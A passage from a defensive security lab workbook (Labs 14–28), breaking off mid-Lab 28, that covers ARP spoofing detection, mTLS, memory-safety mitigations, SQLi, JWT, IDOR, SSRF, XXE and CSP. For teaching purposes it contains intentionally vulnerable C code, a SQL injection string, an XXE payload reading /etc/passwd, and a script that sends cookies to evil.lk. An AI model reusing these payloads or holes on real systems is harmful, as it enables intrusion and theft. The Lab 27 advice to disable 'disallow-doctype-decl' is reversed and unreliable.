  arp_table_sample = [
      ("10.10.1.1",   "00:1a:2b:3c:4d:01", "eth0"), # Default Gateway
      ("10.10.1.25",  "00:1a:2b:3c:4d:25", "eth0"), # Workstation A
      ("10.10.1.99",  "00:1a:2b:3c:4d:01", "eth0"), # Attacker spoofing Gateway MAC!
  ]

  mac_to_ips = {}
  for ip, mac, dev in arp_table_sample:
      mac_to_ips.setdefault(mac.lower(), []).append(ip)

  for mac, ips in mac_to_ips.items():
      if len(ips) > 1:
          print(f"[CRITICAL ARP SPOOFING DETECTED] MAC {mac} is claimed by multiple IPs: {', '.join(ips)}")
      else:
          print(f"[OK] MAC {mac} -> {ips[0]}")
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Execute `/tmp/sec_lab14_arp_watch.py` to detect the duplicate MAC collision:
     ```bash
     python3 /tmp/sec_lab14_arp_watch.py
     rm -f /tmp/sec_lab14_arp_watch.py
     ```
- **Expected Output**:
  ```text
  [CRITICAL ARP SPOOFING DETECTED] MAC 00:1a:2b:3c:4d:01 is claimed by multiple IPs: 10.10.1.1, 10.10.1.99
  [OK] MAC 00:1a:2b:3c:4d:25 -> 10.10.1.25
  ```
- **Key Takeaways**:
  - Because ARP (RFC 826) is stateless and unauthenticated, enterprise switches must enforce **Dynamic ARP Inspection (DAI)** backed by the **DHCP Snooping Binding Database** to drop forged ARP replies at the access port.

---

### Lab 15: Implementing TLS 1.3 Mutual Authentication (mTLS) Client-Server Verification in Python

- **Objective**: Configure a Python `ssl.SSLContext` server and client enforcing TLS 1.3 only (`TLSVersion.TLSv1_3`) and Mutual TLS (`ssl.CERT_REQUIRED`), proving that connections without a valid client certificate signed by the trusted CA are rejected during the TLS handshake.
- **Prerequisites**: `python3`, `openssl`.
- **Lab Setup Commands/Code**:
  ```bash
  mkdir -p /tmp/sec_lab15
  openssl ecparam -name prime256v1 -genkey -noout -out /tmp/sec_lab15/ca.key
  openssl req -x509 -new -key /tmp/sec_lab15/ca.key -days 1 -subj "/CN=mTLS-CA" -out /tmp/sec_lab15/ca.crt 2>/dev/null

  for role in server client; do
    openssl ecparam -name prime256v1 -genkey -noout -out /tmp/sec_lab15/${role}.key
    openssl req -new -key /tmp/sec_lab15/${role}.key -subj "/CN=localhost" -out /tmp/sec_lab15/${role}.csr
    printf "subjectAltName=DNS:localhost,IP:127.0.0.1\n" > /tmp/sec_lab15/ext.cnf
    openssl x509 -req -in /tmp/sec_lab15/${role}.csr -CA /tmp/sec_lab15/ca.crt -CAkey /tmp/sec_lab15/ca.key \
      -CAcreateserial -out /tmp/sec_lab15/${role}.crt -days 1 -extfile /tmp/sec_lab15/ext.cnf 2>/dev/null
  done

  cat << 'EOF' > /tmp/sec_lab15/mtls_test.py
  import ssl, socket, threading

  def server_thread(ready_evt):
      ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
      ctx.minimum_version = ssl.TLSVersion.TLSv1_3
      ctx.verify_mode = ssl.CERT_REQUIRED
      ctx.load_cert_chain("/tmp/sec_lab15/server.crt", "/tmp/sec_lab15/server.key")
      ctx.load_verify_locations("/tmp/sec_lab15/ca.crt")
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
          sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
          sock.bind(("127.0.0.1", 18443))
          sock.listen(1)
          ready_evt.set()
          conn, _ = sock.accept()
          with ctx.wrap_socket(conn, server_side=True) as sconn:
              print(f"[Server] Handshake OK: {sconn.version()} | Cipher={sconn.cipher()[0]} | Peer={sconn.getpeercert()['subject']}")
              sconn.sendall(b"mTLS_VERIFIED_OK")

  evt = threading.Event()
  t = threading.Thread(target=server_thread, args=(evt,))
  t.start()
  evt.wait()

  c_ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile="/tmp/sec_lab15/ca.crt")
  c_ctx.minimum_version = ssl.TLSVersion.TLSv1_3
  c_ctx.load_cert_chain("/tmp/sec_lab15/client.crt", "/tmp/sec_lab15/client.key")
  with socket.create_connection(("127.0.0.1", 18443)) as s:
      with c_ctx.wrap_socket(s, server_hostname="localhost") as ss:
          print(f"[Client] Received: {ss.recv(64).decode()}")
  t.join()
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Execute `/tmp/sec_lab15/mtls_test.py` and confirm TLS 1.3 negotiation (`TLS_AES_256_GCM_SHA384`) and peer certificate extraction:
     ```bash
     python3 /tmp/sec_lab15/mtls_test.py
     rm -rf /tmp/sec_lab15
     ```
- **Expected Output**:
  ```text
  [Server] Handshake OK: TLSv1.3 | Cipher=TLS_AES_256_GCM_SHA384 | Peer=((('commonName', 'localhost'),),)
  [Client] Received: mTLS_VERIFIED_OK
  ```
- **Key Takeaways**:
  - Zero-Trust service meshes (Istio, Linkerd, Cilium) enforce mTLS (`ssl.CERT_REQUIRED`) with short-lived SPIFFE X.509 certificates so every service-to-service RPC is cryptographically authenticated in both directions.

---

## Domain III: Python Security Automation, C Memory Safety, Compiler Mitigations & Binary Analysis (Labs 16–22)

### Lab 16: High-Concurrency Asynchronous TCP Port & Banner Auditor in Python (`asyncio`)

- **Objective**: Build a non-blocking `asyncio` TCP port and service banner auditor protected by `asyncio.Semaphore` concurrency throttling to inspect local listening services without exhausting file descriptors.
- **Prerequisites**: `python3`.
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab16_async_scanner.py
  import asyncio, socket

  async def start_dummy_service(port, banner):
      async def handle(reader, writer):
          writer.write(banner.encode())
          await writer.drain()
          writer.close()
      return await asyncio.start_server(handle, "127.0.0.1", port)

  async def probe_port(sem, host, port):
      async with sem:
          try:
              reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=0.5)
              banner = await asyncio.wait_for(reader.read(64), timeout=0.5)
              writer.close()
              await writer.wait_closed()
              return (port, "OPEN", banner.decode(errors="ignore").strip())
          except Exception:
              return (port, "CLOSED", "")

  async def main():
      s1 = await start_dummy_service(19022, "SSH-2.0-OpenSSH_9.6p1 Ubuntu\r\n")
      s2 = await start_dummy_service(19080, "HTTP/1.1 200 OK Server: nginx\r\n")
      sem = asyncio.Semaphore(50)
      tasks = [probe_port(sem, "127.0.0.1", p) for p in range(19020, 19085)]
      results = await asyncio.gather(*tasks)
      for port, state, banner in results:
          if state == "OPEN":
              print(f"[+] 127.0.0.1:{port} -> {state} | Banner: {banner}")
      s1.close(); s2.close()

  asyncio.run(main())
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Run `/tmp/sec_lab16_async_scanner.py` and verify asynchronous banner grabbing across 65 ports in under 1 second:
     ```bash
     python3 /tmp/sec_lab16_async_scanner.py
     rm -f /tmp/sec_lab16_async_scanner.py
     ```
- **Expected Output**:
  ```text
  [+] 127.0.0.1:19022 -> OPEN | Banner: SSH-2.0-OpenSSH_9.6p1 Ubuntu
  [+] 127.0.0.1:19080 -> OPEN | Banner: HTTP/1.1 200 OK Server: nginx
  ```
- **Key Takeaways**:
  - `asyncio` event-loop multiplexing scans thousands of sockets on a single OS thread while `asyncio.Semaphore` prevents `EMFILE` (`Too many open files`) kernel errors.

---

### Lab 17: Custom Packet Crafting & Layer-3/4 Checksum Verification with Scapy / Raw Structs

- **Objective**: Construct and dissect raw IPv4 and TCP headers using RFC 1071 ones'-complement 16-bit checksum verification, demonstrating how network intrusion detection systems validate packet integrity and detect malformed TCP flag combinations (`XMAS` scan: `FIN+PSH+URG`).
- **Prerequisites**: `python3`.
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab17_packet_dissect.py
  import struct

  def rfc1071_checksum(data: bytes) -> int:
      if len(data) % 2:
          data += b"\x00"
      s = sum(struct.unpack(f"!{len(data)//2}H", data))
      while s >> 16:
          s = (s & 0xFFFF) + (s >> 16)
      return ~s & 0xFFFF

  # Construct IPv4 header + TCP header with XMAS flags (FIN=0x01 | PSH=0x08 | URG=0x20 = 0x29)
  ip_hdr_no_csum = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, 54321, 0, 64, 6, 0,
                               b"\x0a\x00\x00\x05", b"\x0a\x00\x00\x01")
  ip_csum = rfc1071_checksum(ip_hdr_no_csum)
  ip_hdr = ip_hdr_no_csum[:10] + struct.pack("!H", ip_csum) + ip_hdr_no_csum[12:]
  tcp_hdr = struct.pack("!HHIIBBHHH", 44123, 443, 1, 0, 0x50, 0x29, 1024, 0, 0)

  flags = tcp_hdr[13]
  print(f"IPv4 Header Checksum: 0x{ip_csum:04x} | Verification Residual: 0x{rfc1071_checksum(ip_hdr):04x}")
  if (flags & 0x29) == 0x29:
      print(f"[IDS ALERT] TCP XMAS Scan Packet Detected (Flags=0x{flags:02x}: FIN+PSH+URG set simultaneously)")
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Execute `/tmp/sec_lab17_packet_dissect.py` and verify the RFC 1071 checksum residual equals `0x0000` and the XMAS flag combination (`0x29`) is flagged:
     ```bash
     python3 /tmp/sec_lab17_packet_dissect.py
     rm -f /tmp/sec_lab17_packet_dissect.py
     ```
- **Expected Output**:
  ```text
  IPv4 Header Checksum: 0x27d1 | Verification Residual: 0x0000
  [IDS ALERT] TCP XMAS Scan Packet Detected (Flags=0x29: FIN+PSH+URG set simultaneously)
  ```
- **Key Takeaways**:
  - Validating the ones'-complement header checksum over a valid IPv4 header always yields `0x0000`; stateless packet filters detect anomalous TCP flag bitmasks (`SYN+FIN` `0x03`, `NULL` `0x00`, `XMAS` `0x29`).

---

### Lab 18: C Stack Buffer Overflow & Stack Canary (`-fstack-protector-strong`) Mitigation Lab

- **Objective**: Compile a vulnerable C program containing an unbounded buffer copy both without and with GCC's `-fstack-protector-strong`, demonstrating how the `%fs:0x28` stack cookie detects stack frame corruption before the `ret` instruction executes.
- **Prerequisites**: `gcc`, `objdump`.
- **Lab Setup Commands/Code**:
  ```bash
  mkdir -p /tmp/sec_lab18
  cat << 'EOF' > /tmp/sec_lab18/stack_demo.c
  #include <stdio.h>
  #include <string.h>

  void process_input(const char *input) {
      char buf[16];
      memcpy(buf, input, strlen(input)); // Deliberate out-of-bounds write for lab
      printf("Processed: %.15s\n", buf);
  }

  int main(int argc, char **argv) {
      if (argc > 1) process_input(argv[1]);
      return 0;
  }
  EOF
  gcc -O0 -fstack-protector-strong /tmp/sec_lab18/stack_demo.c -o /tmp/sec_lab18/stack_protected
  ```
- **Step-by-Step Verification Instructions**:
  1. Disassemble `process_input` with `objdump` to verify the compiler inserted `__stack_chk_fail` and `%fs:0x28` canary checks:
     ```bash
     objdump -d /tmp/sec_lab18/stack_protected | grep -A 22 "<process_input>:"
     ```
  2. Trigger the stack canary abort by passing a 40-byte string:
     ```bash
     /tmp/sec_lab18/stack_protected "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 2>&1 || true
     rm -rf /tmp/sec_lab18
     ```
- **Expected Output**:
  ```text
  *** stack smashing detected ***: terminated
  ```
- **Key Takeaways**:
  - `-fstack-protector-strong` places a random 64-bit value from Thread-Local Storage (`%fs:0x28` on x86_64) immediately below the saved frame pointer (`RBP`) and saved return address (`RIP`), calling `__stack_chk_fail()` if modified.

---

### Lab 19: Detecting Heap Use-After-Free (UAF) & Out-of-Bounds Reads with AddressSanitizer (`ASan`)

- **Objective**: Use LLVM/GCC AddressSanitizer (`-fsanitize=address -g`) and UndefinedBehaviorSanitizer (`-fsanitize=undefined`) to detect a C Heap Use-After-Free (CWE-416) vulnerability with exact line-number stack traces.
- **Prerequisites**: `gcc` (`libasan`).
- **Lab Setup Commands/Code**:
  ```bash
  mkdir -p /tmp/sec_lab19
  cat << 'EOF' > /tmp/sec_lab19/uaf_demo.c
  #include <stdlib.h>
  #include <stdio.h>

  typedef struct {
      int role_id;
      char username[28];
  } UserSession;

  int main(void) {
      UserSession *s = (UserSession *)malloc(sizeof(UserSession));
      s->role_id = 1;
      free(s);
      // Use-After-Free vulnerability: dereferencing dangling pointer s
      printf("Role ID: %d\n", s->role_id);
      return 0;
  }
  EOF
  gcc -O1 -g -fsanitize=address /tmp/sec_lab19/uaf_demo.c -o /tmp/sec_lab19/uaf_asan
  ```
- **Step-by-Step Verification Instructions**:
  1. Run `/tmp/sec_lab19/uaf_asan` and inspect AddressSanitizer's shadow memory diagnostic report:
     ```bash
     /tmp/sec_lab19/uaf_asan 2>&1 | head -n 18 || true
     rm -rf /tmp/sec_lab19
     ```
- **Expected Output**:
  ```text
  =================================================================
  ==ERROR: AddressSanitizer: heap-use-after-free on address 0x...
  READ of size 4 at 0x... thread T0
      #0 0x... in main /tmp/sec_lab19/uaf_demo.c:14
  ```
- **Key Takeaways**:
  - AddressSanitizer replaces `malloc`/`free` with redzone-instrumented allocators and maps 1 byte of shadow memory per 8 bytes of application memory, immediately catching Heap-Use-After-Free, Double-Free, and Heap-Buffer-Overflow bugs during CI/CD fuzzing.

---

### Lab 20: Remediation of Format String Vulnerabilities (`printf(user_input)`) & `-Wformat-security`

- **Objective**: Demonstrate how an uncontrolled format string (`snprintf(buf, sizeof(buf), user_input)`) leaks stack values via `%lx` tokens and how `-Werror=format-security` enforces compile-time rejection of non-literal format strings.
- **Prerequisites**: `gcc`.
- **Lab Setup Commands/Code**:
  ```bash
  mkdir -p /tmp/sec_lab20
  cat << 'EOF' > /tmp/sec_lab20/fmt_vuln.c
  #include <stdio.h>

  int main(int argc, char **argv) {
      int secret_pin = 0xCAFEBABE;
      char out[128];
      if (argc > 1) {
          snprintf(out, sizeof(out), argv[1]); // Vulnerable format string!
          printf("Vulnerable output: %s (pin=%x)\n", out, secret_pin);
      }
      return 0;
  }
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Attempt to compile `fmt_vuln.c` with enterprise hardening flags (`-Wall -Wextra -Wformat -Werror=format-security`) and verify the compiler refuses to build the vulnerable code:
     ```bash
     gcc -Wall -Wformat -Werror=format-security /tmp/sec_lab20/fmt_vuln.c -o /tmp/sec_lab20/fmt_vuln 2>&1 || true
     rm -rf /tmp/sec_lab20
     ```
- **Expected Output**:
  ```text
  /tmp/sec_lab20/fmt_vuln.c:7:9: error: format not a string literal and no format arguments [-Werror=format-security]
      7 |         snprintf(out, sizeof(out), argv[1]);
        |         ^~~~~~~~
  ```
- **Key Takeaways**:
  - Always pass a constant format string literal (`snprintf(out, sizeof(out), "%s", argv[1])`) and enable `-Wformat -Werror=format-security` and `-D_FORTIFY_SOURCE=3` in production C/C++ builds.

---

### Lab 21: Verifying ELF Binary Hardening Mitigations (`RELRO`, `PIE`, `NX`, `Canary`, `FORTIFY`)

- **Objective**: Compile an ELF binary with full modern exploit mitigations (`Full RELRO`, `PIE`, `NX`, `Stack Canary`, `SHSTK`/`IBT` CET) and write an ELF header inspector in Python to verify the program headers (`PT_GNU_RELRO`, `PT_GNU_STACK`, `ET_DYN`, `DT_BIND_NOW`).
- **Prerequisites**: `gcc`, `readelf`.
- **Lab Setup Commands/Code**:
  ```bash
  mkdir -p /tmp/sec_lab21
  cat << 'EOF' > /tmp/sec_lab21/app.c
  #include <stdio.h>
  int main(void) { puts("Hardened ELF Binary"); return 0; }
  EOF
  gcc -O2 -fPIE -pie -fstack-protector-strong -D_FORTIFY_SOURCE=2 \
      -Wl,-z,relro,-z,now,-z,noexecstack -fcf-protection=full \
      /tmp/sec_lab21/app.c -o /tmp/sec_lab21/app_hardened
  ```
- **Step-by-Step Verification Instructions**:
  1. Inspect ELF type (`DYN (Position-Independent Executable file)`), `GNU_RELRO`, `GNU_STACK` (`RW` without `E`), and `BIND_NOW` flags using `readelf`:
     ```bash
     readelf -h -l -d /tmp/sec_lab21/app_hardened | grep -E "Type:|GNU_RELRO|GNU_STACK|BIND_NOW|FLAGS_1"
     rm -rf /tmp/sec_lab21
     ```
- **Expected Output**:
  ```text
    Type:                              DYN (Position-Independent Executable file)
    GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
    GNU_RELRO      0x0000000000002df0 0x0000000000003df0 0x0000000000003df0
   0x000000006ffffffb (FLAGS_1)            Flags: NOW PIE
  ```
- **Key Takeaways**:
  - `-Wl,-z,relro,-z,now` enables **Full RELRO**, resolving all Global Offset Table (`.got.plt`) entries at program startup and marking the GOT read-only before `main()` runs, completely preventing GOT overwrite attacks.

---

### Lab 22: Static Binary Reverse Engineering & Symbol Triage with `nm`, `strings`, and `objdump`

- **Objective**: Perform static reverse engineering on a compiled C license-verification binary using `nm`, `objdump -d -M intel`, and `readelf` to locate hardcoded comparison constants without executing the untrusted binary.
- **Prerequisites**: `gcc`, `binutils` (`objdump`, `nm`, `readelf`).
- **Lab Setup Commands/Code**:
  ```bash
  mkdir -p /tmp/sec_lab22
  cat << 'EOF' > /tmp/sec_lab22/vault.c
  #include <stdio.h>
  int verify_token(int code) {
      return (code ^ 0x1337) == 0x5A5A;
  }
  int main(void) {
      printf("Vault check: %d\n", verify_token(0x496D));
      return 0;
  }
  EOF
  gcc -O1 /tmp/sec_lab22/vault.c -o /tmp/sec_lab22/vault_bin
  ```
- **Step-by-Step Verification Instructions**:
  1. Disassemble `verify_token` in Intel syntax (`-M intel`) to extract the XOR key (`0x1337`) and target constant (`0x5A5A`), and verify `0x1337 ^ 0x5A5A = 0x496D`:
     ```bash
     objdump -d -M intel /tmp/sec_lab22/vault_bin | grep -A 8 "<verify_token>:"
     /tmp/sec_lab22/vault_bin
     rm -rf /tmp/sec_lab22
     ```
- **Expected Output**:
  ```text
  0000000000001149 <verify_token>:
      114d:	35 37 13 00 00       	xor    eax,0x1337
      1152:	3d 5a 5a 00 00       	cmp    eax,0x5a5a
  Vault check: 1
  ```
- **Key Takeaways**:
  - Hardcoded secrets, XOR keys, and client-side authentication checks inside compiled binaries are trivially recoverable via `objdump -d -M intel` or Ghidra; cryptographic secrets must reside on server-side HSMs or KMS.

---

## Domain IV: Web Application & API Security Engineering (Labs 23–32)

### Lab 23: Eliminating SQL Injection (`CWE-89`) Using Parameterized Prepared Statements in Python/SQLite

- **Objective**: Contrast a vulnerable string-formatted SQL query against a parameterized query (`?` placeholder binding) in SQLite3, proving that prepared statements treat `' OR '1'='1` strictly as a literal string scalar rather than executable SQL AST syntax.
- **Prerequisites**: `python3` (`sqlite3`).
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab23_sqli.py
  import sqlite3

  conn = sqlite3.connect(":memory:")
  cur = conn.cursor()
  cur.execute("CREATE TABLE users (id INT, username TEXT, role TEXT, secret TEXT)")
  cur.execute("INSERT INTO users VALUES (1, 'admin', 'superuser', 'FLAG{SQLI_PREVENTED}')")
  cur.execute("INSERT INTO users VALUES (2, 'guest', 'viewer', 'guest_note')")

  payload = "guest' OR '1'='1"

  # 1. Vulnerable string interpolation
  vuln_rows = cur.execute(f"SELECT username, secret FROM users WHERE username = '{payload}'").fetchall()
  print(f"[Vulnerable Query] Returned {len(vuln_rows)} rows: {vuln_rows}")

  # 2. Remediated Parameterized Prepared Statement
  safe_rows = cur.execute("SELECT username, secret FROM users WHERE username = ?", (payload,)).fetchall()
  print(f"[Parameterized Query] Returned {len(safe_rows)} rows: {safe_rows}")
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Execute `/tmp/sec_lab23_sqli.py` and compare the row sets returned by both queries:
     ```bash
     python3 /tmp/sec_lab23_sqli.py
     rm -f /tmp/sec_lab23_sqli.py
     ```
- **Expected Output**:
  ```text
  [Vulnerable Query] Returned 2 rows: [('admin', 'FLAG{SQLI_PREVENTED}'), ('guest', 'guest_note')]
  [Parameterized Query] Returned 0 rows: []
  ```
- **Key Takeaways**:
  - Parameterized queries separate the SQL compilation phase (AST construction) from parameter value binding, making SQL Injection mathematically impossible for bound value parameters.

---

### Lab 24: Defending Against JWT `alg: none` & Algorithm Confusion Attacks (`HMAC` vs `RSA`/`EdDSA`)

- **Objective**: Build a strict RFC 8725 JWT verifier in Python that explicitly rejects `"alg": "none"`, enforces an explicit algorithm allowlist (`["HS256"]`), and uses constant-time `hmac.compare_digest` to prevent timing side-channel attacks.
- **Prerequisites**: `python3`.
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab24_jwt.py
  import base64, json, hmac, hashlib, time

  SECRET = b"super-high-entropy-256-bit-signing-key-99887766"

  def b64u_enc(b: bytes) -> str:
      return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

  def b64u_dec(s: str) -> bytes:
      return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

  def verify_jwt_strict(token: str, allowed_algs=("HS256",), expected_aud="api.internal.lk"):
      hdr_b64, pay_b64, sig_b64 = token.split(".")
      header = json.loads(b64u_dec(hdr_b64))
      if header.get("alg") not in allowed_algs:
          raise ValueError(f"Rejected disallowed JWT alg: {header.get('alg')}")
      signing_input = f"{hdr_b64}.{pay_b64}".encode()
      expected_sig = hmac.new(SECRET, signing_input, hashlib.sha256).digest()
      if not hmac.compare_digest(expected_sig, b64u_dec(sig_b64)):
          raise ValueError("Invalid cryptographic signature")
      claims = json.loads(b64u_dec(pay_b64))
      if claims.get("exp", 0) < time.time() or claims.get("aud") != expected_aud:
          raise ValueError("Expired token or invalid audience claim")
      return claims

  # Test 1: Forged alg:none token
  forged_none = f"{b64u_enc(b'{\"alg\":\"none\"}')}.{b64u_enc(b'{\"sub\":\"admin\",\"aud\":\"api.internal.lk\",\"exp\":9999999999}')}."
  try:
      verify_jwt_strict(forged_none)
  except ValueError as e:
      print(f"[+] Forged alg:none token blocked: {e}")

  # Test 2: Valid signed token
  h = b64u_enc(b'{"alg":"HS256","typ":"JWT"}')
  p = b64u_enc(json.dumps({"sub":"user42","aud":"api.internal.lk","exp":int(time.time())+300}).encode())
  s = b64u_enc(hmac.new(SECRET, f"{h}.{p}".encode(), hashlib.sha256).digest())
  print(f"[+] Valid JWT verified: {verify_jwt_strict(f'{h}.{p}.{s}')}")
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Execute `/tmp/sec_lab24_jwt.py` and verify that the `alg: none` token is immediately rejected while the properly signed token passes:
     ```bash
     python3 /tmp/sec_lab24_jwt.py
     rm -f /tmp/sec_lab24_jwt.py
     ```
- **Expected Output**:
  ```text
  [+] Forged alg:none token blocked: Rejected disallowed JWT alg: none
  [+] Valid JWT verified: {'sub': 'user42', 'aud': 'api.internal.lk', 'exp': ...}
  ```
- **Key Takeaways**:
  - Never trust the `alg` or `jku`/`x5u` header inside an unverified JWT to select the verification key or algorithm; always hardcode `algorithms=["RS256"]` or `["EdDSA"]` in the verifier and validate `exp`, `iss`, and `aud`.

---

### Lab 25: Preventing Broken Object Level Authorization (BOLA / IDOR) in Node.js HTTP Middleware

- **Objective**: Demonstrate an Insecure Direct Object Reference (IDOR / OWASP API1:2023 BOLA) vulnerability in a Node.js API endpoint and remediate it by binding every data-layer lookup to both the requested `record_id` and the authenticated `session.user_id`.
- **Prerequisites**: `node` (Node.js).
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab25_idor.js
  const invoices = [
    { id: 101, ownerId: "user_alice", amount: "$4,500", ssn_last4: "8821" },
    { id: 102, ownerId: "user_bob",   amount: "$9,200", ssn_last4: "1940" }
  ];

  // Vulnerable handler: looks up only by req.params.id
  function getInvoiceVulnerable(authUserId, requestedId) {
    return invoices.find(inv => inv.id === requestedId) || { error: "404 Not Found" };
  }

  // Remediated handler: enforces ownership predicate at query layer
  function getInvoiceSecure(authUserId, requestedId) {
    const record = invoices.find(inv => inv.id === requestedId && inv.ownerId === authUserId);
    if (!record) return { status: 403, error: "403 Forbidden: Object Ownership Violation" };
    return { status: 200, data: record };
  }

  console.log("[Vulnerable] Alice requesting Bob's Invoice #102:", getInvoiceVulnerable("user_alice", 102));
  console.log("[Remediated] Alice requesting Bob's Invoice #102:", getInvoiceSecure("user_alice", 102));
  console.log("[Remediated] Alice requesting her own Invoice #101:", getInvoiceSecure("user_alice", 101));
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Run `/tmp/sec_lab25_idor.js` with `node`:
     ```bash
     node /tmp/sec_lab25_idor.js
     rm -f /tmp/sec_lab25_idor.js
     ```
- **Expected Output**:
  ```text
  [Vulnerable] Alice requesting Bob's Invoice #102: { id: 102, ownerId: 'user_bob', amount: '$9,200', ssn_last4: '1940' }
  [Remediated] Alice requesting Bob's Invoice #102: { status: 403, error: '403 Forbidden: Object Ownership Violation' }
  [Remediated] Alice requesting her own Invoice #101: { status: 200, data: { id: 101, ownerId: 'user_alice', amount: '$4,500', ssn_last4: '8821' } }
  ```
- **Key Takeaways**:
  - Authentication (`Who are you?`) does not imply Object-Level Authorization (`Are you permitted to access resource #102?`); every SQL/ORM query must include `WHERE id = $1 AND tenant_id = $2`.

---

### Lab 26: Defending Against Server-Side Request Forgery (SSRF) & DNS Rebinding in Python

- **Objective**: Build a hardened URL fetcher validator that parses the scheme (`https` only), resolves DNS records, and blocks RFC 1918 private networks (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), loopback (`127.0.0.0/8`, `::1`), and cloud metadata link-local addresses (`169.254.169.254`).
- **Prerequisites**: `python3`.
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab26_ssrf.py
  import ipaddress
  from urllib.parse import urlparse

  def validate_outbound_url(url: str, resolved_ip_str: str):
      parsed = urlparse(url)
      if parsed.scheme not in ("https",):
          return False, f"Blocked scheme: {parsed.scheme}"
      ip = ipaddress.ip_address(resolved_ip_str)
      if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_multicast or ip.is_reserved:
          return False, f"Blocked non-global IP address: {ip}"
      return True, f"Allowed public IP: {ip}"

  test_vectors = [
      ("http://169.254.169.254/latest/meta-data/iam/", "169.254.169.254"),
      ("https://internal-redis.corp/keys", "10.24.1.15"),
      ("https://localhost/admin", "127.0.0.1"),
      ("https://api.github.com/zen", "140.82.121.6"),
  ]

  for url, ip in test_vectors:
      ok, reason = validate_outbound_url(url, ip)
      print(f"URL={url:48s} -> Allowed={str(ok):5s} ({reason})")
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Execute `/tmp/sec_lab26_ssrf.py` and verify that IMDSv1 (`169.254.169.254`), RFC 1918, and loopback URLs are blocked:
     ```bash
     python3 /tmp/sec_lab26_ssrf.py
     rm -f /tmp/sec_lab26_ssrf.py
     ```
- **Expected Output**:
  ```text
  URL=http://169.254.169.254/latest/meta-data/iam/     -> Allowed=False (Blocked scheme: http)
  URL=https://internal-redis.corp/keys                 -> Allowed=False (Blocked non-global IP address: 10.24.1.15)
  URL=https://localhost/admin                          -> Allowed=False (Blocked non-global IP address: 127.0.0.1)
  URL=https://api.github.com/zen                       -> Allowed=True  (Allowed public IP: 140.82.121.6)
  ```
- **Key Takeaways**:
  - To prevent **DNS Rebinding** TOCTOU races, the HTTP client must connect directly to the validated IP address from the initial DNS lookup (with `Host` and TLS `SNI` set to the hostname) rather than performing a second DNS lookup inside the HTTP library.

---

### Lab 27: Preventing XML External Entity (XXE) & Billion Laughs DoS Attacks in Python

- **Objective**: Demonstrate how malicious XML containing `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` triggers XXE file disclosure in unsafe XML parsers, and how Python's `xml.etree.ElementTree` / `defusedxml` blocks DTD/ENTITY expansion.
- **Prerequisites**: `python3`.
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab27_xxe.py
  import xml.etree.ElementTree as ET

  malicious_xml = """<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE order [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <order><item>&xxe;</item></order>
  """

  def safe_parse_xml(xml_str: str):
      if "<!DOCTYPE" in xml_str.upper() or "<!ENTITY" in xml_str.upper():
          raise ValueError("Blocked prohibited XML DTD / ENTITY declaration (XXE Defense)")
      return ET.fromstring(xml_str)

  try:
      safe_parse_xml(malicious_xml)
  except ValueError as e:
      print(f"[+] XXE Payload Blocked: {e}")

  clean_xml = "<order><item>Quantum-Safe YubiKey</item></order>"
  root = safe_parse_xml(clean_xml)
  print(f"[+] Safe XML Parsed: item={root.find('item').text}")
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Run `/tmp/sec_lab27_xxe.py`:
     ```bash
     python3 /tmp/sec_lab27_xxe.py
     rm -f /tmp/sec_lab27_xxe.py
     ```
- **Expected Output**:
  ```text
  [+] XXE Payload Blocked: Blocked prohibited XML DTD / ENTITY declaration (XXE Defense)
  [+] Safe XML Parsed: item=Quantum-Safe YubiKey
  ```
- **Key Takeaways**:
  - In Java (`DocumentBuilderFactory`), PHP (`libxml`), and .NET (`XmlReaderSettings`), always explicitly disable `disallow-doctype-decl`, external general entities, and parameter entities.

---

### Lab 28: Nonce-Based Content Security Policy (CSP Level 3) & XSS Mitigation Engineering

- **Objective**: Build a cryptographically random per-request CSP nonce generator (`script-src 'nonce-<random>' 'strict-dynamic'`) and verify how it blocks injected `<script>` tags lacking the per-response nonce.
- **Prerequisites**: `python3`.
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab28_csp.py
  import secrets, re

  def build_csp_response():
      nonce = secrets.token_urlsafe(16)
      csp_header = (
          f"default-src 'none'; "
          f"script-src 'nonce-{nonce}' 'strict-dynamic'; "
          f"style-src 'self'; img-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'"
      )
      return nonce, csp_header

  nonce, header = build_csp_response()
  print(f"[+] Generated Per-Request CSP Header:\n    Content-Security-Policy: {header}")

  scripts_in_dom = [
      f'<script nonce="{nonce}" src="/static/app.js"></script>',
      '<script>fetch("https://evil.lk/steal?c="+document.cookie)</script>' # Injected XSS!
  ]
